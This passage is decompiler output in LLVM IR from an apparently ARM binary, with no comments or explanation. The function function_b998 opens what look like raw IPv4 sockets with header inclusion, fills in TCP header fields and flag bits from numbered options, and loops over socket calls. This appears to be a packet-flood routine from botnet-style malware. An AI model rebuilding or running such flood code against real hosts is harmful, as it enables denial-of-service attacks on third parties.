  store i32 %v5_b8b0, i32* %r2.global-to-local, align 4
  %v4_b8b428 = udiv i32 %v2_b86c, 256
  %v1_b8b8 = trunc i32 %v4_b8b428 to i8
  %v2_b8b8 = load i32, i32* @r4, align 4
  %v3_b8b8 = add i32 %v2_b8b8, 11
  %v4_b8b8 = inttoptr i32 %v3_b8b8 to i8*
  store i8 %v1_b8b8, i8* %v4_b8b8, align 1
  %v3_b8bc = load i32, i32* @r4, align 4
  %v4_b8bc = add i32 %v3_b8bc, 10
  %v5_b8bc = inttoptr i32 %v4_b8bc to i8*
  store i8 %v3_b86c, i8* %v5_b8bc, align 1
  %v0_b8c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8c0 = load i32, i32* @r5, align 4
  %v2_b8c0 = add i32 %v1_b8c0, 8
  %v3_b8c0 = inttoptr i32 %v2_b8c0 to i32*
  store i32 %v0_b8c0, i32* %v3_b8c0, align 4
  %v0_b8c4 = load i32, i32* @r5, align 4
  store i32 %v0_b8c4, i32* @r1, align 4
  %v0_b8c8 = load i32, i32* @r8, align 4
  store i32 %v0_b8c8, i32* %r2.global-to-local, align 4
  %v0_b8cc = load i32, i32* @r7, align 4
  store i32 %v0_b8cc, i32* %r3.global-to-local, align 4
  %v0_b8d0 = load i32, i32* @r4, align 4
  store i32 %v0_b8d0, i32* %r0.global-to-local, align 4
  %v0_b8d4 = load i32, i32* @r6, align 4
  %v1_b8d4 = trunc i32 %v0_b8d4 to i8
  %v3_b8d4 = add i32 %v0_b8c4, 16
  %v4_b8d4 = inttoptr i32 %v3_b8d4 to i8*
  store i8 %v1_b8d4, i8* %v4_b8d4, align 1
  %v0_b8d8 = load i32, i32* @r6, align 4
  %v1_b8d8 = trunc i32 %v0_b8d8 to i8
  %v2_b8d8 = load i32, i32* @r5, align 4
  %v3_b8d8 = add i32 %v2_b8d8, 17
  %v4_b8d8 = inttoptr i32 %v3_b8d8 to i8*
  store i8 %v1_b8d8, i8* %v4_b8d8, align 1
  %v4_b8dc = call i32 @function_d114(i32 %v0_b8d0, i32 %v0_b8c4, i32 %v0_b8c8, i32 %v0_b8cc)
  %v5_b8dc = trunc i32 %v4_b8dc to i8
  store i32 %v4_b8dc, i32* %r0.global-to-local, align 4
  %v4_b8e029 = udiv i32 %v4_b8dc, 256
  %v1_b8e4 = trunc i32 %v4_b8e029 to i8
  %v2_b8e4 = load i32, i32* @r5, align 4
  %v3_b8e4 = add i32 %v2_b8e4, 17
  %v4_b8e4 = inttoptr i32 %v3_b8e4 to i8*
  store i8 %v1_b8e4, i8* %v4_b8e4, align 1
  %v3_b8e8 = load i32, i32* @r5, align 4
  %v4_b8e8 = add i32 %v3_b8e8, 16
  %v5_b8e8 = inttoptr i32 %v4_b8e8 to i8*
  store i8 %v5_b8dc, i8* %v5_b8e8, align 1
  %v3_b8ec = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b8ec, i32* %r3.global-to-local, align 4
  %v0_b8f0 = load i32, i32* @r4, align 4
  %v1_b8f0 = add i32 %v0_b8f0, 20
  %v2_b8f0 = inttoptr i32 %v1_b8f0 to i32*
  %v3_b8f0 = load i32, i32* %v2_b8f0, align 4
  %v5_b8f8 = mul i32 %v3_b8ec, 24
  %v3_b900 = udiv i32 %v3_b8f0, 65536
  store i32 %v3_b900, i32* %r2.global-to-local, align 4
  %v2_b904 = add i32 %v5_b8f8, %arg2
  store i32 %v2_b904, i32* %ip.global-to-local, align 4
  %v3_b9084 = udiv i32 %v3_b8f0, 16777216
  %v1_b90c = trunc i32 %v3_b9084 to i8
  %v3_b90c = add i32 %v2_b904, 3
  %v4_b90c = inttoptr i32 %v3_b90c to i8*
  store i8 %v1_b90c, i8* %v4_b90c, align 1
  %v0_b910 = load i32, i32* %r2.global-to-local, align 4
  %v1_b910 = trunc i32 %v0_b910 to i8
  %v2_b910 = load i32, i32* %ip.global-to-local, align 4
  %v3_b910 = add i32 %v2_b910, 2
  %v4_b910 = inttoptr i32 %v3_b910 to i8*
  store i8 %v1_b910, i8* %v4_b910, align 1
  %v0_b914 = load i32, i32* @r4, align 4
  store i32 %v0_b914, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_b308, i32* %r0.global-to-local, align 4
  %v0_b920 = load i32, i32* @sl, align 4
  store i32 %v0_b920, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_b928 = load i32, i32* %ip.global-to-local, align 4
  %v6_b930 = inttoptr i32 %v0_b914 to i32*
  %v7_b930 = call i32 @function_1237c(i32 %v3_b308, i32* %v6_b930, i32 %v0_b920, i32 16384, i32 %v0_b928, i32 16)
  %v3_b934 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b934, i32* %r3.global-to-local, align 4
  %v1_b938 = add i32 %v3_b934, 1
  store i32 %v1_b938, i32* %r0.global-to-local, align 4
  %v1_b93c = load i32, i32* @fp, align 4
  %v9_b93c = icmp eq i32 %v1_b938, %v1_b93c
  store i1 %v9_b93c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b938, i32* %stack_var_-40, align 4
  %v6_b944 = icmp slt i32 %v1_b938, %v1_b93c
  br i1 %v6_b944, label %dec_label_pc_b948, label %dec_label_pc_b800

dec_label_pc_b948:                                ; preds = %dec_label_pc_b85c
  store i32 %v2_b168, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_b350, i32* %ip.global-to-local, align 4
  %v4_b954 = mul i32 %v1_b938, 4
  %v5_b954 = add i32 %v4_b954, %v2_b168
  %v6_b954 = inttoptr i32 %v5_b954 to i32*
  %v7_b954 = load i32, i32* %v6_b954, align 4
  store i32 %v7_b954, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_b834, i1* %cpsr_z.global-to-local, align 1
  %v1_b960 = add i32 %v7_b954, 20
  store i32 %v1_b960, i32* @r5, align 4
  br i1 %v3_b834, label %dec_label_pc_b968, label %dec_label_pc_b848

dec_label_pc_b968:                                ; preds = %dec_label_pc_b948, %dec_label_pc_b80c
  %v0_b968 = call i32 @function_e978()
  %v1_b968 = trunc i32 %v0_b968 to i8
  store i32 %v1_b2f8, i32* %lr.global-to-local, align 4
  %v4_b970 = sdiv i32 %v0_b968, 256
  store i32 %v4_b970, i32* %r3.global-to-local, align 4
  store i1 %v2_b84c, i1* %cpsr_z.global-to-local, align 1
  %v3_b978 = load i32, i32* @r4, align 4
  %v4_b978 = add i32 %v3_b978, 4
  %v5_b978 = inttoptr i32 %v4_b978 to i8*
  store i8 %v1_b968, i8* %v5_b978, align 1
  %v0_b97c = load i32, i32* %r3.global-to-local, align 4
  %v1_b97c = trunc i32 %v0_b97c to i8
  %v2_b97c = load i32, i32* @r4, align 4
  %v3_b97c = add i32 %v2_b97c, 5
  %v4_b97c = inttoptr i32 %v3_b97c to i8*
  store i8 %v1_b97c, i8* %v4_b97c, align 1
  %v0_b980 = load i32, i32* @r4, align 4
  %v1_b980 = add i32 %v0_b980, 40
  store i32 %v1_b980, i32* %r0.global-to-local, align 4
  %v0_b984 = load i32, i32* @sb, align 4
  store i32 %v0_b984, i32* @r1, align 4
  %v0_b988 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b988, label %dec_label_pc_b85c, label %dec_label_pc_b98c

dec_label_pc_b98c:                                ; preds = %dec_label_pc_b848, %dec_label_pc_b968
  %v0_b98c = phi i32 [ %v1_b850, %dec_label_pc_b848 ], [ %v1_b980, %dec_label_pc_b968 ]
  %v1_b98c = inttoptr i32 %v0_b98c to i8*
  %v2_b98c = call i32 @function_eaf8(i8* %v1_b98c)
  store i32 %v2_b98c, i32* %r0.global-to-local, align 4
  %v2_b85c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b85c

; uselistorder directives
  uselistorder i32 %v0_b980, { 1, 0 }
  uselistorder i32 %v7_b954, { 1, 2, 0 }
  uselistorder i32 %v1_b93c, { 1, 2, 0 }
  uselistorder i32 %v1_b938, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_b8dc, { 0, 2, 1 }
  uselistorder i32 %v0_b8c4, { 1, 0, 2 }
  uselistorder i32 %v3_b8a0, { 1, 0 }
  uselistorder i32 %v3_b880, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b86c, { 0, 2, 1 }
  uselistorder i32 %v0_b850, { 1, 0 }
  uselistorder i32 %v0_b80c, { 1, 0 }
  uselistorder i32 %v0_b800, { 1, 0 }
  uselistorder i1 %v3_b834, { 2, 3, 1, 0 }
  uselistorder i32 %v1_b7e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b73c, { 0, 2, 1 }
  uselistorder i32 %v3_b71c, { 1, 0 }
  uselistorder i32 %v0_b6f0, { 1, 0, 2 }
  uselistorder i32 %v3_b6e4, { 1, 0 }
  uselistorder i32 %v3_b678, { 1, 0 }
  uselistorder i32 %v0_b66c, { 1, 0 }
  uselistorder i32 %v3_b5f4, { 1, 0 }
  uselistorder i32 %v2_b5e0, { 1, 0 }
  uselistorder i32 %v3_b5c4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_b5bc, { 1, 0 }
  uselistorder i32 %v3_b598, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b590, { 1, 0 }
  uselistorder i32 %v4_b578, { 1, 0 }
  uselistorder i32 %v0_b574, { 0, 2, 1 }
  uselistorder i1 %v7_b4e4, { 1, 0 }
  uselistorder i32 %v7_b4dc, { 0, 2, 1, 3 }
  uselistorder i32 %v5_b528, { 1, 0 }
  uselistorder i1 %v9_b50c, { 1, 0 }
  uselistorder i32 %v4_b520, { 1, 0 }
  uselistorder i32 %v4_b51c, { 1, 0 }
  uselistorder i32 %v8_b430, { 1, 2, 0, 3 }
  uselistorder i32 %v3_b41c, { 1, 0 }
  uselistorder i32 %v0_b40c, { 2, 0, 1, 3 }
  uselistorder i1 %v7_b394, { 1, 0 }
  uselistorder i32 %v3_b390, { 2, 1, 0, 3 }
  uselistorder i32 %v1_b7a8, { 1, 0 }
  uselistorder i32 %v1_b790, { 1, 0 }
  uselistorder i32 %v1_b778, { 1, 0 }
  uselistorder i32 %v1_b760, { 1, 0 }
  uselistorder i32 %v1_b748, { 1, 0 }
  uselistorder i32 %v5_b524, { 1, 0 }
  uselistorder i32 %v3_b47893, { 1, 0 }
  uselistorder i1 %v2_b53c, { 1, 0 }
  uselistorder i32 %v1_b538, { 1, 0 }
  uselistorder i32 %v4_b534, { 2, 0, 1 }
  uselistorder i32 %v4_b518, { 1, 0 }
  uselistorder i1 %v3_b460, { 1, 0 }
  uselistorder i32 %v8_b35c, { 2, 1, 0 }
  uselistorder i32 %v8_b358, { 1, 2, 0 }
  uselistorder i32 %v3_b350, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_b34c, { 0, 1, 3, 2 }
  uselistorder i1 %v7_b340, { 1, 0 }
  uselistorder i1 %v7_b310, { 1, 0 }
  uselistorder i32 %v3_b30c, { 2, 0, 1 }
  uselistorder i32 %v3_b308, { 5, 6, 1, 3, 4, 7, 8, 2, 0, 9 }
  uselistorder i32 %v1_b2f8, { 1, 3, 2, 0 }
  uselistorder i32 %v1_b2a0, { 1, 0 }
  uselistorder i32 %v1_b260, { 1, 0 }
  uselistorder i32 %v1_b240, { 1, 0 }
  uselistorder i32 %v1_b220, { 1, 0 }
  uselistorder i32 %v1_b1e8, { 1, 0 }
  uselistorder i32 %v2_b168, { 0, 4, 5, 2, 1, 3 }
  uselistorder i32 %v2_b158, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_b13c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 16, 15 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 6, 5, 10, 7, 8, 11, 9, 19, 12, 13, 14, 15, 16, 17, 18, 23, 20, 21, 22, 24, 26, 25, 28, 27, 31, 29, 32, 33, 30, 62, 35, 34, 36, 37, 39, 38, 43, 40, 41, 42, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 17, 26, 18, 19, 16, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_b98c, { 1, 0 }
  uselistorder label %dec_label_pc_b85c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b7e4, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %.thread6, { 2, 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %dec_label_pc_b56c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b4a4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b454, { 1, 0 }
}

define i32 @function_b998(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b998:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp30 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_b99c = urem i32 %arg1, 256
  store i32 %v1_b99c, i32* @fp, align 4
  store i32 %v1_b99c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b9b4 = urem i32 %arg3, 256
  store i32 %v1_b9b4, i32* @r4, align 4
  %v2_b9b8 = call i32 @function_126cc(i32 %v1_b99c, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b9c4 = load i32, i32* @fp, align 4
  store i32 %v0_b9c4, i32* %r0.global-to-local, align 4
  %v2_b9c8 = call i32 @function_126cc(i32 %v0_b9c4, i32 4)
  %v0_b9cc = load i32, i32* @r5, align 4
  store i32 %v0_b9cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b9dc = load i32, i32* @r4, align 4
  store i32 %v0_b9dc, i32* %r0.global-to-local, align 4
  %v5_b9e0 = inttoptr i32 %v0_b9cc to i32*
  %v6_b9e0 = call i32 @function_85e0(i32 %v0_b9dc, i32* %v5_b9e0, i32 2, i32 0)
  %v1_b9ec = urem i32 %v6_b9e0, 256
  store i32 %v1_b9ec, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b9f8 = load i32, i32* @r5, align 4
  store i32 %v0_b9f8, i32* %r1.global-to-local, align 4
  %v0_b9fc = load i32, i32* @r4, align 4
  store i32 %v0_b9fc, i32* %r0.global-to-local, align 4
  %v6_ba04 = inttoptr i32 %v0_b9f8 to i32*
  %v7_ba04 = call i32 @function_85e0(i32 %v0_b9fc, i32* %v6_ba04, i32 3, i32 65535)
  %v0_ba08 = load i32, i32* @r5, align 4
  store i32 %v0_ba08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_ba04, i32* @r6, align 4
  %v0_ba18 = load i32, i32* @r4, align 4
  store i32 %v0_ba18, i32* %r0.global-to-local, align 4
  %v4_ba1c = inttoptr i32 %v0_ba08 to i32*
  %v5_ba1c = call i32 @function_85e0(i32 %v0_ba18, i32* %v4_ba1c, i32 4, i32 64)
  %v1_ba24 = urem i32 %v5_ba1c, 256
  store i32 %v1_ba24, i32* %ip.global-to-local, align 4
  %v0_ba28 = load i32, i32* @r5, align 4
  store i32 %v0_ba28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ba34 = load i32, i32* @r4, align 4
  store i32 %v0_ba34, i32* %r0.global-to-local, align 4
  %v6_ba3c = inttoptr i32 %v0_ba28 to i32*
  %v7_ba3c = call i32 @function_85e0(i32 %v0_ba34, i32* %v6_ba3c, i32 5, i32 1)
  %v1_ba48 = urem i32 %v7_ba3c, 256
  store i32 %v1_ba48, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ba50 = load i32, i32* @r5, align 4
  store i32 %v0_ba50, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_ba58 = load i32, i32* @r4, align 4
  store i32 %v0_ba58, i32* %r0.global-to-local, align 4
  %v5_ba60 = inttoptr i32 %v0_ba50 to i32*
  %v6_ba60 = call i32 @function_85e0(i32 %v0_ba58, i32* %v5_ba60, i32 7, i32 65535)
  %v0_ba64 = load i32, i32* @r5, align 4
  store i32 %v0_ba64, i32* %r1.global-to-local, align 4
  %v3_ba68 = mul i32 %v6_ba60, 65536
  store i32 %v3_ba68, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ba74 = load i32, i32* @r4, align 4
  store i32 %v0_ba74, i32* %r0.global-to-local, align 4
  %v4_ba78 = inttoptr i32 %v0_ba64 to i32*
  %v5_ba78 = call i32 @function_85e0(i32 %v0_ba74, i32* %v4_ba78, i32 11, i32 0)
  %v1_ba80 = urem i32 %v5_ba78, 256
  store i32 %v1_ba80, i32* %ip.global-to-local, align 4
  %v0_ba84 = load i32, i32* @r5, align 4
  store i32 %v0_ba84, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ba90 = load i32, i32* @r4, align 4
  store i32 %v0_ba90, i32* %r0.global-to-local, align 4
  %v5_ba98 = inttoptr i32 %v0_ba84 to i32*
  %v6_ba98 = call i32 @function_85e0(i32 %v0_ba90, i32* %v5_ba98, i32 12, i32 1)
  %v1_baa0 = urem i32 %v6_ba98, 256
  store i32 %v1_baa0, i32* %ip.global-to-local, align 4
  %v0_baa4 = load i32, i32* @r5, align 4
  store i32 %v0_baa4, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bab0 = load i32, i32* @r4, align 4
  store i32 %v0_bab0, i32* %r0.global-to-local, align 4
  %v5_bab8 = inttoptr i32 %v0_baa4 to i32*
  %v6_bab8 = call i32 @function_85e0(i32 %v0_bab0, i32* %v5_bab8, i32 13, i32 1)
  %v1_bac0 = urem i32 %v6_bab8, 256
  store i32 %v1_bac0, i32* %ip.global-to-local, align 4
  %v0_bac4 = load i32, i32* @r5, align 4
  store i32 %v0_bac4, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bad0 = load i32, i32* @r4, align 4
  store i32 %v0_bad0, i32* %r0.global-to-local, align 4
  %v5_bad8 = inttoptr i32 %v0_bac4 to i32*
  %v6_bad8 = call i32 @function_85e0(i32 %v0_bad0, i32* %v5_bad8, i32 14, i32 0)
  %v1_bae0 = urem i32 %v6_bad8, 256
  store i32 %v1_bae0, i32* %ip.global-to-local, align 4
  %v0_bae4 = load i32, i32* @r5, align 4
  store i32 %v0_bae4, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_baf0 = load i32, i32* @r4, align 4
  store i32 %v0_baf0, i32* %r0.global-to-local, align 4
  %v5_baf8 = inttoptr i32 %v0_bae4 to i32*
  %v6_baf8 = call i32 @function_85e0(i32 %v0_baf0, i32* %v5_baf8, i32 15, i32 0)
  %v1_bb00 = urem i32 %v6_baf8, 256
  store i32 %v1_bb00, i32* %ip.global-to-local, align 4
  %v0_bb04 = load i32, i32* @r5, align 4
  store i32 %v0_bb04, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb10 = load i32, i32* @r4, align 4
  store i32 %v0_bb10, i32* %r0.global-to-local, align 4
  %v5_bb18 = inttoptr i32 %v0_bb04 to i32*
  %v6_bb18 = call i32 @function_85e0(i32 %v0_bb10, i32* %v5_bb18, i32 16, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_bb18, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_bb28 = load i32, i32* @r5, align 4
  store i32 %v0_bb28, i32* %r1.global-to-local, align 4
  %v0_bb2c = load i32, i32* @r4, align 4
  store i32 %v0_bb2c, i32* %r0.global-to-local, align 4
  %v1_bb30 = urem i32 %v6_bb18, 256
  store i32 %v1_bb30, i32* @r8, align 4
  %v4_bb34 = inttoptr i32 %v0_bb28 to i32*
  %v5_bb34 = call i32 @function_85e0(i32 %v0_bb2c, i32* %v4_bb34, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bb40 = load i32, i32* @r5, align 4
  store i32 %v0_bb40, i32* %r1.global-to-local, align 4
  store i32 %v5_bb34, i32* @sb, align 4
  %v0_bb48 = load i32, i32* @r4, align 4
  store i32 %v0_bb48, i32* %r0.global-to-local, align 4
  %v4_bb4c = inttoptr i32 %v0_bb40 to i32*
  %v5_bb4c = call i32 @function_85e0(i32 %v0_bb48, i32* %v4_bb4c, i32 1, i32 1)
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_bb58 = urem i32 %v5_bb4c, 256
  store i32 %v1_bb58, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_bb68 = call i32 @function_123e0(i32 2, i32 3, i32 6)
  store i32 %v3_bb68, i32* %r0.global-to-local, align 4
  %v0_bb6c = load i32, i32* @r7, align 4
  %v3_bb6c = udiv i32 %v0_bb6c, 65536
  store i32 %v3_bb6c, i32* %r1.global-to-local, align 4
  %v7_bb70 = icmp eq i32 %v3_bb68, -1
  store i1 %v7_bb70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bb70, label %dec_label_pc_bdcc, label %dec_label_pc_bb80

dec_label_pc_bb80:                                ; preds = %dec_label_pc_b998
  store i32 1, i32* %stack_var_-40, align 4
  %v6_bb88 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_bb88, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_bb9c = call i32 @function_123b0(i32 %v3_bb68, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_bb9c, i32* %r0.global-to-local, align 4
  %v7_bba0 = icmp eq i32 %v6_bb9c, -1
  store i1 %v7_bba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bba0, label %dec_label_pc_bdc4, label %dec_label_pc_bba8

dec_label_pc_bba8:                                ; preds = %dec_label_pc_bb80
  %v0_bba8 = load i32, i32* @fp, align 4
  %v2_bba8 = icmp eq i32 %v0_bba8, 0
  store i1 %v2_bba8, i1* %cpsr_z.global-to-local, align 1
  %v0_bbac = load i32, i32* @r6, align 4
  %v3_bbac = mul i32 %v0_bbac, 65536
  store i32 %v3_bbac, i32* %r0.global-to-local, align 4
  %v3_bbb0 = urem i32 %v0_bbac, 65536
  store i32 %v3_bbb0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp72 = icmp slt i32 %v0_bba8, 1
  br i1 %tmp72, label %.thread18, label %dec_label_pc_bbd4.preheader

.thread18:                                        ; preds = %dec_label_pc_bba8
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_c058

dec_label_pc_bbd4.preheader:                      ; preds = %dec_label_pc_bba8
  %v5_bbb8 = load i32, i32* @r7, align 4
  %v8_bbb8 = udiv i32 %v5_bbb8, 16777216
  %tmp73 = udiv i32 %v0_bbac, 256
  %v8_bbbc = urem i32 %tmp73, 256
  store i32 %v8_bbbc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_bcc0 = icmp ugt i32 %v0_bb6c, -65537
  %v2_bce4 = ptrtoint i32* %stack_var_-60 to i32
  %v3_bcf0 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v2_bd20 = ptrtoint i32* %stack_var_-76 to i32
  %v2_bd24 = ptrtoint i32* %stack_var_-44 to i32
  %v2_bd28 = ptrtoint i32* %stack_var_-332 to i32
  %v4_bd74 = zext i8 %tmp31 to i32
  %v4_bd78 = zext i8 %tmp30 to i32
  %v4_bd84 = mul nuw nsw i32 %v4_bd78, 256
  %v4_bd94 = zext i8 %tmp to i32
  %v1_bd98 = and i32 %v4_bd94, 18
  %v2_bd9c = icmp eq i32 %v1_bd98, 18
  %v1_bcd0 = mul nuw nsw i32 %v3_bb6c, 256
  %v4_bcd4 = and i32 %v1_bcd0, 65280
  %v5_bcd4 = or i32 %v8_bbb8, %v4_bcd4
  %v3_bcd893 = udiv i32 %v4_bcd4, 256
  %v1_bcdc = trunc i32 %v3_bcd893 to i8
  %v1_bea0 = mul i32 %v0_bbac, 256
  %v4_bea8 = and i32 %v1_bea0, 65280
  %sext = mul i32 %v6_b9e0, 16777216
  %v4_beb8 = sdiv i32 %sext, 16777216
  %sext5 = mul i32 %v5_ba1c, 16777216
  %v4_bedc = sdiv i32 %sext5, 16777216
  %v5_bd84 = or i32 %v4_bd74, %v4_bd84
  %v1_bda4 = and i32 %v4_bd94, 5
  %v2_bda4 = icmp eq i32 %v1_bda4, 0
  %v1_bce0 = trunc i32 %v8_bbb8 to i8
  %v5_bea8 = or i32 %v8_bbbc, %v4_bea8
  %v1_bec8 = trunc i32 %v4_beb8 to i8
  %v1_bfa8 = urem i32 %v5_ba78, 2
  %tmp94 = sub nsw i32 0, %v1_bfa8
  %v4_bfb0 = and i32 %tmp94, 32
  %v1_bfc0 = urem i32 %v6_ba98, 2
  %tmp95 = sub nsw i32 0, %v1_bfc0
  %v4_bfc8 = and i32 %tmp95, 16
  %v1_bfd8 = urem i32 %v6_bab8, 2
  %tmp96 = sub nsw i32 0, %v1_bfd8
  %v4_bfe0 = and i32 %tmp96, 8
  %v1_bff0 = urem i32 %v6_bad8, 2
  %tmp97 = sub nsw i32 0, %v1_bff0
  %v4_bff8 = and i32 %tmp97, 4
  %v1_c008 = urem i32 %v6_baf8, 2
  %tmp98 = sub nsw i32 0, %v1_c008
  %v3_c010 = and i32 %tmp98, 2
  br label %dec_label_pc_bbd4

dec_label_pc_bbd4:                                ; preds = %dec_label_pc_c044, %dec_label_pc_bdac, %dec_label_pc_bbd4.preheader
  store i32 %v8_bbbc, i32* %r3.global-to-local, align 4
  %v0_bbe0 = load i32, i32* @sb, align 4
  %v1_bbe0 = add i32 %v0_bbe0, 40
  store i32 %v1_bbe0, i32* @sl, align 4
  br label %dec_label_pc_bbe4

dec_label_pc_bbe4:                                ; preds = %dec_label_pc_bdb8, %dec_label_pc_bbd4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_bbf0 = call i32 @function_123e0(i32 2, i32 1, i32 0)
  store i32 %v3_bbf0, i32* %r0.global-to-local, align 4
  %v7_bbf4 = icmp eq i32 %v3_bbf0, -1
  store i1 %v7_bbf4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_bbf0, i32* @r7, align 4
